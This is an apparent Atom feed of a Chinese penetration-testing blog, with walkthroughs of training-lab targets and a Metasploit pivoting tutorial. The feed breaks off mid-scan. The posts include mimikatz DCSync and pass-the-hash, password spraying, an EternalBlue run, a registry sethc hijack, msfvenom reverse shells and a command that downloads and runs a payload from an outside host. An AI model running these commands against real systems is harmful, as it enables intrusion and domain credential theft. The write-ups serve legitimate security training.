<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-10-07T14:28:55.446Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>春秋云镜-Tsclient</title>
    <link href="https://ke1nys.github.io/posts/72d64c19.html"/>
    <id>https://ke1nys.github.io/posts/72d64c19.html</id>
    <published>2023-10-07T13:16:01.000Z</published>
    <updated>2023-10-07T14:28:55.446Z</updated>
    
    <content type="html"><![CDATA[<p>常规操作 fscan开扫</p><p><img src="../images/image-20231007211805267.png" alt="image-20231007211805267"></p><p>只有一个win主机  并且这个win主机的话 是开启了mssql服务  并且使用了弱口令</p><p>MDUT登录</p><p><img src="../images/image-20231007211940258.png" alt="image-20231007211940258"></p><p>这条权限开启了  尝试土豆家族提权</p><p>然后上线CS</p><p><img src="../images/image-20231007212152027.png" alt="image-20231007212152027"></p><p>这里的话我是使用了spawn来派生到meterpreter</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/118353886">https://blog.csdn.net/weixin_39190897/article/details/118353886</a></p><p>其实meterpreter的getsystem自带这个土豆提权</p><p>在拿到第一个flag的时候 <strong>提示我们看看域内有没有别的用户</strong> </p><p>于是我们使用别的命令进行查看  （<strong>等会我们偷下别人的图  因为懒的重置靶机重新打了）</strong></p><p><em>**</em> <img src="../images/image-20231007212726960.png" alt="image-20231007212726960"></p><p><img src="../images/image-20231007212737126.png" alt="image-20231007212737126"></p><p><img src="../images/image-20231007212755698.png" alt="image-20231007212755698"></p><p>因为我们获得了这个system权限  于是我们直接注入这个用户的rdp进程</p><p><img src="../images/image-20231007212906974.png" alt="image-20231007212906974"></p><p>上线后查看用户可以看到它存在共享文件</p><p><img src="../images/image-20231007212925680.png" alt="image-20231007212925680"></p><p>然后直接访问这个共享文件夹的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type \\tsclient\c\credential.txt</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell type \\tsclient\c\credential.txt</span><br><span class="line">[*] Tasked beacon to run: type \\tsclient\c\credential.txt</span><br><span class="line">[+] host called home, sent: 63 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br><span class="line"></span><br><span class="line">Do you know how to hijack Image?</span><br></pre></td></tr></table></figure></blockquote><p>读出来一个域账户和提示</p><p>于是先去尝试进行密码喷洒攻击  看看是谁的密码</p><p>(但是是在内网  于是我们先上传fscan扫一下)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">172.22.8.18  就是外网主机的内网地址  WIN-WEB</span><br><span class="line"></span><br><span class="line">172.22.8.15  DC01 </span><br><span class="line"></span><br><span class="line">172.22.8.31  WIN19-CLIENT</span><br><span class="line"></span><br><span class="line">172.22.8.46  Win2016</span><br><span class="line"></span><br><span class="line">netstat的时候看到  31正在RDP18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这次拿win主机来当跳板机</span><br></pre></td></tr></table></figure><p>整理好信息后  我们上传代理</p><p>然后密码喷洒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br><span class="line">proxychains4 crackmapexec rdp 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# -d xiaorang.lab</span><br></pre></td></tr></table></figure><p>smb和RDP谁都可以</p><p>然后发现31 46都可以 </p><p>于是进行登录  这里rdp登录会话的会提示密码过期</p><p>于是我们对这两账号密码进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Whoami@666&#x27;</span><br></pre></td></tr></table></figure><p>但是这里话只能登录  46这台机器  31这台机器的话不可以  会提示我们不在远程登录这个组里面</p><p>登录46这台机器后呢  我们根据前面的提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do you know how to hijack Image?</span><br></pre></td></tr></table></figure><p>就是镜像提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</span><br><span class="line"></span><br><span class="line">//这个是查看权限</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231007222419719.png" alt="image-20231007222419719"></p><p>这个用户就是经过身份验证的用户获取到的权限</p><p><strong>(SetValue  CreateSubKey ReadKey)的话  就是具有读写权限</strong></p><p><a href="https://www.freebuf.com/articles/es/214551.html">https://www.freebuf.com/articles/es/214551.html</a>  <strong>镜像劫持的文章</strong></p><p>这里我们发现所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>简单的说就是打开注册表的同时  管理员cmd命令行也会弹出来 </p><p>然后我们点击左下角的头像  点锁定</p><p><img src="../images/image-20231007213906983.png" alt="image-20231007213906983"></p><p>然后连续点击shift  就会弹出来了</p><p><img src="../images/image-20231007213944604.png" alt="image-20231007213944604"></p><p>然后就可以读取flag了</p><p>然后开始sharpblood查看域</p><p><img src="../images/image-20231007214100613.png" alt="image-20231007214100613"></p><p>发现了我们rdp的这个机器有域控的权限</p><p>因为我们也获取了该机器的管理员权限</p><p>使用<code>sekurlsa::logonpasswords</code>抓取本机hash值</p><p>于是我们使用mimikatz导出该机器的hash值进行hash传递</p><p>然后执行dscync来导出域内所有hash值 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. sekurlsa::logonpasswords</span><br><span class="line">2. mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:4ba974f170ab0fe1a8a1eb0ed8f6fe1a&quot; &quot;exit&quot;</span><br><span class="line">3. mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">这样的话我们就能拿到域管的hash值了</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后拿着域管的hash值进行pth攻击就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python psexec.py -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.46</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;常规操作 fscan开扫&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231007211805267.png&quot; alt=&quot;image-20231007211805267&quot;&gt;&lt;/p&gt;
&lt;p&gt;只有一个win主机  并且这个win主机的话 是开启了mss</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Initial</title>
    <link href="https://ke1nys.github.io/posts/327fc326.html"/>
    <id>https://ke1nys.github.io/posts/327fc326.html</id>
    <published>2023-10-06T10:33:59.000Z</published>
    <updated>2023-10-06T11:14:12.774Z</updated>
    
    <content type="html"><![CDATA[<p>这个靶机比较特殊  他是由三部分的flag组成一个完整的flag</p><p><img src="../images/image-20231006183707297.png" alt="image-20231006183707297"></p><p>漏洞都给扫出来了 直接去打就行了</p><p><img src="../images/image-20231006184027853.png" alt="image-20231006184027853"></p><p>直接去写马  然后反弹shell</p><p><img src="../images/image-20231006184318407.png" alt="image-20231006184318407"></p><p><img src="../images/image-20231006184327154.png" alt="image-20231006184327154"></p><p>然后sudo -l 发现了这个mysql可以利用来提权</p><p><img src="../images/image-20231006184416198.png" alt="image-20231006184416198"></p><p><img src="../images/image-20231006184457584.png" alt="image-20231006184457584"></p><p><img src="../images/image-20231006184514890.png" alt="image-20231006184514890"></p><p>上传个fscan扫一下内网</p><p><img src="../images/image-20231006185041206.png" alt="image-20231006185041206"></p><p>整理一下信息</p><blockquote><p>172.22.1.2  DC域控主机</p><p>172.22.1.15  外网主机  getshell</p><p>172.22.1.18   3306  OA系统</p><p>172.22.1.21  域内主机  MS17  永恒之蓝</p></blockquote><p>先给这个linux主机上msf先  </p><p><img src="../images/image-20231006185355983.png" alt="image-20231006185355983"></p><p>成功上线</p><p>然后去使用stowaway挂个代理</p><p><img src="../images/image-20231006190449700.png" alt="image-20231006190449700"></p><p>既然说这个21这个台主机存在<strong>MS17</strong></p><p>这里的话我是用kali下的msf打的  服务器上的话不知道为啥老是失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>如果要是再服务器上用的话要加上route add xxxx</p><p><img src="../images/image-20231006190643419.png" alt="image-20231006190643419"></p><p>成功上线这台域内主机  还是system权限</p><p>然后上传个<code>sharphound.exe</code>进去分析一下域内环境</p><p><img src="../images/image-20231006190804985.png" alt="image-20231006190804985"></p><p>发现这个机器对域控有DCSync权限  于是我们导出域内所有人的hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231006191007593.png" alt="image-20231006191007593"></p><p>拿到了域管的hash值  那么直接pth攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">hash传递攻击的几种方法  (其原理都是使用smb服务来进行攻击)</span><br><span class="line"></span><br><span class="line">psexec.py</span><br><span class="line"></span><br><span class="line">proxychains4 python psexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/administrator@172.22.1.2</span><br><span class="line"></span><br><span class="line">-hashes: 域管hash值 dscyn获取</span><br><span class="line">xiaorang.lab  域名</span><br><span class="line">administrator 域管账户</span><br><span class="line">172.22.1.2 域控账户</span><br><span class="line"></span><br><span class="line">wmiexec.py</span><br><span class="line"></span><br><span class="line">proxychains4 python wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/administrator@172.22.1.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">crackmapexec  (这种是不能进入shell命令行的 )</span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">impacket-wmiexec </span><br><span class="line"></span><br><span class="line">proxychains4 impacket-wmiexec xiaorang.lab/administrator@172.22.1.18 -hashes :10cf89a850fb1cdbe6bb432b859164c8</span><br></pre></td></tr></table></figure><p><strong>这就是使用pth攻击的几种方法  这里就打完了  拿着域管的hash去登录另一台机器就行了  (OA)</strong></p><p>(上面工具原理就是基于这个<strong>SMB服务</strong>   <strong>445端口</strong>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个靶机比较特殊  他是由三部分的flag组成一个完整的flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231006183707297.png&quot; alt=&quot;image-20231006183707297&quot;&gt;&lt;/p&gt;
&lt;p&gt;漏洞都给扫出来了 直</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Msf反弹shell与不出网主机上线</title>
    <link href="https://ke1nys.github.io/posts/af4fc312.html"/>
    <id>https://ke1nys.github.io/posts/af4fc312.html</id>
    <published>2023-10-04T13:29:20.000Z</published>
    <updated>2023-10-06T08:58:22.626Z</updated>
    
    <content type="html"><![CDATA[<p>这里用这个春秋云镜的Certify靶机举例子</p><p><strong>使用这里的前提是先反弹shell到我们的vps上</strong></p><p>先使用web_delivery这模块来进行监听</p><p><img src="../images/image-20231004213357075.png" alt="image-20231004213357075"></p><p><img src="../images/image-20231004213438149.png" alt="image-20231004213438149"></p><p>把这几个地方配置好  然后run运行  我们就会的到一个命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO 2yheDLvT --no-check-certificate http://101.42.39.110:1234/605OcaF; chmod +x 2yheDLvT; ./2yheDLvT&amp; disown</span><br></pre></td></tr></table></figure><p>然后到tmp目录下进行运行</p><p><img src="../images/image-20231004213603113.png" alt="image-20231004213603113"></p><p>然后我们的这个web_delivery这个模块就可以监听到反弹的shell</p><p>然后查看内网ip</p><p>设置route</p><p><img src="../images/image-20231004213819118.png" alt="image-20231004213819118"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">图中写错了 </span><br><span class="line">应该是 route add 172.22.9.0 255.255.0.0 1   不用set</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>(前面的172.22.9.0是内网ip  然后255.255.0.0  后面跟着的是session的id)</strong></p><p><img src="../images/image-20231004213924480.png" alt="image-20231004213924480"></p><p>然后再使用msfvenom来生成windows的exe文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.2.7 LPORT=9002 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>这里的Lhost就是我们getshell的linux机器</p><p>然后我们使用   exploit/multi/handler 进行监听windows机器反弹的shell</p><p><img src="../images/image-20231004214103299.png" alt="image-20231004214103299"></p><p>然后设置paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231004214247968.png" alt="image-20231004214247968"></p><p>然后把这两个设置好  把刚刚生成的exe文件丢到这个内网windows主机里运行就行了  这里怎么访问这个主机呢  得自己设置代理  我就不讲了这里</p><p><strong>这里不用route add xxxxxx其实也可以</strong></p><p>这里的有个别的骚方法就是使用proxychains msfconsole</p><p>这里的话就可以替代这个route add xxxx了</p><p>如果是服务器上没有msf的话 也没关系  我们在kali使用bind_tcp效果是一样的 <strong>(就是替代reverse_tcp)</strong></p><p>这里还有一种方法是使用 <a href="https://github.com/ph4ntonn/Stowaway">Stowaway</a></p><p><strong>使用方法的话我写在这个端口转发那篇这里</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里用这个春秋云镜的Certify靶机举例子&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用这里的前提是先反弹shell到我们的vps上&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先使用web_delivery这模块来进行监听&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-2</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Potato家族本地提权</title>
    <link href="https://ke1nys.github.io/posts/7a8168b7.html"/>
    <id>https://ke1nys.github.io/posts/7a8168b7.html</id>
    <published>2023-10-03T06:31:23.000Z</published>
    <updated>2023-10-03T06:37:03.238Z</updated>
    
    <content type="html"><![CDATA[<p>占个坑位   来记录一下这个Potato提权</p><p><strong>(这个提权的话主要就是针对这个windows服务账户的提权)</strong></p><p><a href="https://www.freebuf.com/articles/web/256360.html">https://www.freebuf.com/articles/web/256360.html</a>    文章1</p><p><a href="https://xz.aliyun.com/t/7776/">https://xz.aliyun.com/t/7776/</a>  文章2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;占个坑位   来记录一下这个Potato提权&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(这个提权的话主要就是针对这个windows服务账户的提权)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/256360</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Brute4Road</title>
    <link href="https://ke1nys.github.io/posts/989b194c.html"/>
    <id>https://ke1nys.github.io/posts/989b194c.html</id>
    <published>2023-10-02T12:08:19.000Z</published>
    <updated>2023-10-03T06:43:40.155Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>fscan开扫 </p><p><img src="../images/image-20231002201316156.png" alt="image-20231002201316156"></p><p>80端口没啥用  就一个centos   然后就是ftp的匿名登录  看了一下也没啥  直接就去看redis这个未授权了</p><p>这里的话创建文件的话是没有权限  所以我们尝试去使用工具来进行反弹shell  <strong>(<a href="https://github.com/n0b0dyCN/redis-rogue-server">主从复制RCE</a>)</strong></p><p><img src="../images/image-20231002202320251.png" alt="image-20231002202320251"></p><blockquote><p>./redis-rogue-server.py —rhost 39.99.136.166 —lhost xx.xx.xxx.xxx</p></blockquote><p>因为这个命令太难看了  所以使用python交互一下</p><p>​    <img src="../images/image-20231002202440595.png" alt="image-20231002202440595"></p><p>想读取flag发现没有权限</p><p><img src="../images/image-20231002202526060.png" alt="image-20231002202526060"></p><p>然后就去尝试提权操作</p><p><strong>还是三个方法挨个试(suid sudo 内核)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002202730230.png" alt="image-20231002202730230"></p><p>觉得这个base64很眼熟  于是上网站上找一下</p><p><img src="../images/image-20231002202817191.png" alt="image-20231002202817191"></p><p><img src="../images/image-20231002202908054.png" alt="image-20231002202908054"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>先查看内网ip</p><p><img src="../images/image-20231002203044113.png" alt="image-20231002203044113"></p><p>发现没有这个命令  于是上传<a href="https://github.com/cdk-team/CDK">cdk</a>上去执行</p><p><img src="../images/image-20231002204121390.png" alt="image-20231002204121390"></p><p>上传fscan扫描内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.3   域控  win</span><br><span class="line"></span><br><span class="line">172.22.2.7   ---&gt; 这是getshell的linux机器</span><br><span class="line"></span><br><span class="line">172.22.2.16  mssqlserver win</span><br><span class="line"></span><br><span class="line">172.22.2.18  web02 ubuntu  wordpress</span><br><span class="line"></span><br><span class="line">172.22.2.34  client01/域内机器</span><br></pre></td></tr></table></figure><p>整理收集到的信息   看到了这个wordpress这个东西   老样子直接拿<code>wpscan</code>老扫</p><p><strong>先去搭建隧道  (还是使用chisel   这里就不多写了)</strong></p><p><img src="../images/image-20231002204926138.png" alt="image-20231002204926138"></p><p>搭建成功  开扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[+] URL: http://172.22.2.18/ [172.22.2.18]</span><br><span class="line">[+] Started: Mon Oct  2 20:50:32 2023</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://172.22.2.18/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://172.22.2.18/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;</span><br><span class="line"> |  - http://172.22.2.18/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwentytwo</span><br><span class="line"> | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4</span><br><span class="line"> | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2</span><br><span class="line"> | Style Name: Twenty Twenty-Two</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwentytwo/</span><br><span class="line"> | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wpcargo</span><br><span class="line"> | Location: http://172.22.2.18/wp-content/plugins/wpcargo/</span><br><span class="line"> | Last Updated: 2023-08-26T14:28:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 6.13.3</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 6.x.x (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK                                                      &gt; (0 / 137)  0.00%  ETA: ??:??:??</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK                                                     &gt; (19 / 137) 13.86%  ETA: 00:00:05</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK                                                     &gt; 